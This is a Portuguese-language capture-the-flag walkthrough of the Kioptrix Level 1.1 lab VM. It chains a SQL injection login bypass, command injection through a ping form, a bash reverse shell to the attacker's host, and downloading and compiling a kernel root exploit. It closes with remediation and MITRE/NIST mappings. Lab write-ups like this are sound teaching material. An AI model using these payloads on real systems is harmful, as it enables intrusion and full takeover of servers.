# Kioptrix: Level 1.1 — SQL, Comandos e um Kernel Que Não Pode Ser Confiado

Mano, Kioptrix Level 1.1 (Level 2) eleva o nível do buffer overflow puro do Level 1. Essa combina três vulnerabilidades em cima uma da outra: injeção SQL para contornar autenticação, injeção de comando em um utilitário de ping, e um escalonamento de privilégios via kernel. Cada uma é fundamental, e a cadeia é limpa. Véi, é exatamente assim que ataques reais de aplicações web combinados com pós-exploração funcionam. Técnica clássica, top demais.

A injeção de comando no formulário de ping é genuinamente um dos momentos mais satisfatórios na história do CTF: você autentica com `' or '1'='1'`, recebe um utilitário de ping baseado em web, e imediatamente percebe "posso injetar comandos aqui." Clássico. gg

---

| Campo | Valor |
|---|---|
| **Nível** | Fácil |
| **VM Alvo** | Kioptrix: Level 1.1 (#2) |
| **VM Atacante** | Kali Linux 2024.x |
| **VulnHub URL** | https://www.vulnhub.com/entry/kioptrix-level-11-2,23/ |
| **Técnicas** | Enumeração de serviços com Nmap, bypass de autenticação via SQLi, injeção de comando via formulário de ping, reverse shell, escalonamento de privilégios via kernel local (EDB-9542) |
| **CVEs** | CWE-89 (Injeção SQL: bypass de autenticação via formulário de login sem sanitização); CWE-78 (Injeção de Comando OS: entrada do usuário passada diretamente para shell via formulário de ping); CVE-2009-2698 (kernel Linux 2.6.x sock_sendpage NULL pointer dereference, EDB-9542 root local) |
| **Grupos APT** | Bypass de autenticação via SQLi é usado pelo APT41 em acesso inicial a aplicações web; padrões de injeção de comando aparecem nas ferramentas pós-exploração do OceanLotus (APT32) para alvos Linux |

---

## Resumo do Ataque

```
netdiscover → alvo: 192.168.1.111
    |
    v
nmap → HTTP (80), HTTPS (443), SSH (22), MySQL (3306)
    |
    v
acessar http://192.168.1.111 → formulário de login admin
    |
    v
SQLi: usuário = 1' or '1' senha = 1' or '1'
    |
    v
autenticado → página do utilitário de ping
    |
    v
injeção de comando: 127.0.0.1; bash -i >& /dev/tcp/LHOST/8888 0>&1
    |
    v
reverse shell como usuário apache
    |
    v
uname -a → kernel 2.6.9-55.EL
    |
    v
EDB-9542 → compilar + executar → uid=0(root)
    |
    v
flag root
```

---

## Metodologia

1. Descoberta de rede e varredura completa de portas
2. Análise da aplicação web: identificar formulário de login
3. Bypass SQLi para ganhar acesso autenticado
4. Identificar vulnerabilidade de injeção de comando no utilitário de ping
5. Entregar reverse shell via injeção de comando
6. Estabilizar shell
7. Enumerar versão do kernel
8. Compilar e executar exploit de kernel local
9. Acesso root confirmado

---

## Passo 1 — Descoberta do Host e Varredura de Portas

```bash
sudo netdiscover -r 192.168.1.0/24

nmap -sV -sC -p- 192.168.1.111
```

Descobertas principais:

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 3.9p1
80/tcp   open  http    Apache httpd 2.0.52
443/tcp  open  ssl
3306/tcp open  mysql   MySQL 4.1.22
```

HTTP na porta 80 é o alvo principal. MySQL exposto na 3306 é uma observação secundária. O Apache 2.0.x é antigo o suficiente para ter seus próprios CVEs, mas a aplicação web é a superfície de ataque.

**MITRE ATT&CK:** T1046 — Descoberta de Serviços de Rede

---

## Passo 2 — Análise da Aplicação Web

Acesse `http://192.168.1.111/`. Um formulário de login admin é apresentado imediatamente.

Antes de tentar credenciais, teste para injeção SQL. O formulário de login provavelmente usa uma query como:

```sql
SELECT * FROM users WHERE username='$user' AND password='$pass'
```

Se a aplicação concatena a entrada do usuário diretamente no SQL sem parametrização, a injeção funciona.

**MITRE ATT&CK:** T1190 — Explorar Aplicação Exposta

---

## Passo 3 — Bypass de Autenticação via SQLi

Teste o payload clássico de bypass de autenticação:

```
Usuário: 1' or '1'='1
Senha: 1' or '1'='1
```

Isso transforma a query SQL em:

```sql
SELECT * FROM users WHERE username='1' OR '1'='1' AND password='1' OR '1'='1'
```

A condição `OR '1'='1'` sempre avalia para verdadeiro, contornando completamente a verificação de credenciais. O servidor autentica e apresenta uma página com utilitário de ping.

**Nota do mundo real:** Injeção SQL em formulários de autenticação foi a vulnerabilidade web definidora dos anos 2000 e permanece no OWASP Top 10 sob A03:2021 (Injeção). A correção é conhecida desde 1998: queries parametrizadas / prepared statements. Mas bypasses de autenticação por SQLi ainda aparecem em pentests reais, especialmente em aplicações legadas.

**MITRE ATT&CK:** T1190 — Explorar Aplicação Exposta; T1078 — Contas Válidas (contornadas)

---

## Passo 4 — Injeção de Comando via Formulário de Ping

A página pós-login apresenta um formulário "Ping a Machine on the Network." A aplicação pega a entrada do usuário e passa para um comando shell como:

```php
system("ping -c 3 " . $_POST['ip']);
```

Teste para injeção de comando:

```
127.0.0.1; id
```

Se a saída incluir `uid=48(apache)`, a injeção de comando está confirmada. O ponto-e-vírgula termina o comando ping e inicia um novo comando.

**Por que isso funciona:** o desenvolvedor trata o formulário de ping como um "utilitário seguro" mas passa a entrada do usuário diretamente para o SO sem escape ou whitelist. Isso é CWE-78 em sua forma mais pura.

**MITRE ATT&CK:** T1059.004 — Interpretador de Comando: Unix Shell; T1190 — Explorar Aplicação Exposta

---

## Passo 5 — Entrega do Reverse Shell

Inicie um listener:

```bash
nc -lvnp 8888
```

Envie o payload de reverse shell pelo formulário de ping:

```
127.0.0.1; bash -i >& /dev/tcp/192.168.1.2/8888 0>&1
```

Shell chega como usuário `apache` (uid=48). Estabilize:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```

**Nota:** Este kernel é antigo o suficiente para ter Python 2 mas não Python 3. Use `python` em vez de `python3` se o comando pty falhar.

**MITRE ATT&CK:** T1059.004 — Interpretador de Comando: Unix Shell

---

## Passo 6 — Escalonamento de Privilégios via Kernel (EDB-9542)

Verifique a versão do kernel:

```bash
uname -a
# Linux kioptrix.level2 2.6.9-55.EL #1 Wed May 2 13:52:16 EDT 2007 i686
```

Kernel 2.6.9-55.EL é vulnerável a um exploit de escalonamento de privilégios local (Exploit-DB 9542, também relacionado ao CVE-2009-2698). É uma NULL pointer dereference na função `sock_sendpage`.

Transfira o exploit para o alvo:

```bash
# No atacante: inicie um servidor HTTP simples
python3 -m http.server 80

# No shell da vítima:
cd /tmp
wget http://192.168.1.2/9542.c -O shell.c
# ou:
curl http://192.168.1.2/9542.c -o shell.c
```

Compile e execute:

```bash
gcc shell.c -o shell
./shell
```

Resultado esperado:

```bash
id
# uid=0(root) gid=0(root) groups=0(root)
whoami
# root
```

Caramba véi, três vulnerabilidades encadeadas e root em mãos! Sensacional!

**Nota do mundo real:** Exploits locais de kernel para Linux 2.6.x foram prolíficos entre 2008 e 2012. CVE-2009-2698, CVE-2010-3081 (RDS) e CVE-2009-1185 (udev) são exemplos clássicos. Kernels Linux modernos (5.x+) têm mitigações de exploit muito mais fortes (SMEP, SMAP, KASLR, seccomp).

**MITRE ATT&CK:** T1068 — Exploração para Escalonamento de Privilégios

---

## Flags, Hashes e Credenciais Capturadas

| Tipo | Valor | Encontrado Em | Notas |
|---|---|---|---|
| Bypass de autenticação | Payload SQLi | Formulário de login | Contorna verificação de credenciais completamente |
| Shell inicial | apache (uid=48) | Injeção de comando no formulário de ping | Sem credenciais necessárias |
| Shell root | uid=0(root) | Exploit de kernel EDB-9542 | /tmp/shell compilado no alvo |

---

## Lições Aprendidas

| # | Descoberta | Relevância no Mundo Real | Principal Lição |
|---|---|---|---|
| 1 | Bypass de autenticação via SQLi | Ainda no OWASP Top 10; apps legadas com concatenação de string em queries SQL são trivialmente contornáveis | Usar queries parametrizadas em todas as interações com banco de dados |
| 2 | Injeção de comando no formulário de ping | Qualquer entrada do usuário passada para comandos OS sem escape cria RCE | Whitelist de entrada válida (apenas IPs); usar `escapeshellarg()`; nunca passar input bruto para system() |
| 3 | MySQL exposto na 3306 | Portas de banco de dados expostas à rede aumentam dramaticamente a superfície de ataque | Vincular MySQL ao localhost: `bind-address = 127.0.0.1` no my.cnf |
| 4 | Linux kernel 2.6.9 sem patches | Dezenas de exploits LPE públicos existem para kernel 2.6.x; gcc no alvo torna compilação trivial | Manter kernel com patches; implementar hardening de kernel (SMEP/SMAP/seccomp) |
| 5 | Múltiplas vulnerabilidades encadeadas | SQLi + injeção de comando + kernel LPE é uma cadeia realista contra apps web legadas | Defesa em profundidade: corrigir qualquer link único quebra a cadeia |

---

## Mapeamento MITRE ATT&CK

| Fase | Tática | Técnica | ID TTP |
|---|---|---|---|
| Reconhecimento | Descoberta | Descoberta de Serviços de Rede | T1046 |
| Acesso Inicial | Acesso Inicial | Explorar Aplicação Exposta (bypass SQLi) | T1190 |
| Acesso Inicial | Acesso Inicial | Contas Válidas (contornadas via SQLi) | T1078 |
| Execução | Execução | Interpretador de Comando: Unix Shell (injeção de comando) | T1059.004 |
| Escalonamento de Privilégios | Escalonamento de Privilégios | Exploração para Escalonamento de Privilégios (kernel LPE) | T1068 |

---

## Remediação e Contenção

### Correções Técnicas

1. **Corrigir SQLi**: Substituir concatenação de string por queries parametrizadas em todas as interações com banco de dados
2. **Corrigir injeção de comando**: Substituir utilitário de ping por API segura; validar input (formato IP apenas); usar `escapeshellarg()`
3. **Atualizar kernel**: Substituir kernel 2.6.9 por uma versão de kernel atualmente suportada
4. **Vincular MySQL ao localhost**: Adicionar `bind-address = 127.0.0.1` no `/etc/my.cnf`
5. **Atualizar Apache 2.0.52**: Substituir por Apache 2.4.x com headers de segurança

### NIST CSF 2.0

| Função | Categoria | Ação |
|---|---|---|
| Identificar | Gestão de Ativos | Inventariar todas as aplicações web; auditar todas as queries SQL para injeção |
| Proteger | Tecnologia Protetora | Queries parametrizadas em todo SQL; validação de input em todos os campos controlados pelo usuário |
| Proteger | Controle de Acesso | MySQL vinculado ao localhost; firewall portas de banco de dados |
| Detectar | Anomalias e Eventos | Regra WAF para padrões SQLi; detecção de injeção de comando |
| Responder | Planejamento de Resposta | Aplicar patch no kernel; rotacionar todas as credenciais; auditar todas as contas |

### NIST SP 800-53 Rev. 5

| Controle | Descrição | Aplicação |
|---|---|---|
| SI-10 | Validação de Entrada | Whitelist de toda entrada passada para comandos OS; SQL parametrizado |
| CM-7 | Funcionalidade Mínima | MySQL vinculado ao localhost; desabilitar serviços de rede não utilizados |
| SI-2 | Remediação de Falhas | Patch de kernel dentro do SLA definido |

### C2M2

| Domínio | Prática | MIL Alvo |
|---|---|---|
| Gestão de Ameaças e Vulnerabilidades (THREAT) | Realizar Avaliações de Vulnerabilidade | MIL2 |
| Gestão de Ativos (ASSET) | Gerenciar Inventário de TI | MIL2 |
| Gestão de Identidade e Acesso (IAM) | Gerenciar Autenticação | MIL3 |

### MITRE D3FEND

- **D3-SQLP** — Prevenção de Injeção SQL (queries parametrizadas, prepared statements)
- **D3-OSCI** — Prevenção de Injeção de Comando OS (validação de input, sem execução direta de shell)
- **D3-SU** — Atualização de Software (atualização de kernel; atualização do Apache)

---

## Considerações Finais

Kioptrix Level 1.1 é uma progressão perfeita do Level 1. Em vez de um exploit puro, encadeia três vulnerabilidades: SQLi, injeção de comando e kernel LPE. Cada uma é uma técnica real e ensinável. O fato de encadearem tão bem é a brilhância pedagógica desta máquina.

A relevância no mundo real é alta: aplicações web legadas com SQL concatenado como string e inputs de formulário não validados ainda são encontradas em produção. O kernel LPE é a parte histórica, mas as vulnerabilidades de aplicação web são ameaças completamente modernas.

Se você chegar ao root aqui, conquistou de três maneiras diferentes. Parabéns, véi! gg fr fr.

Thanks guys!! (❍ᴥ❍ʋ)
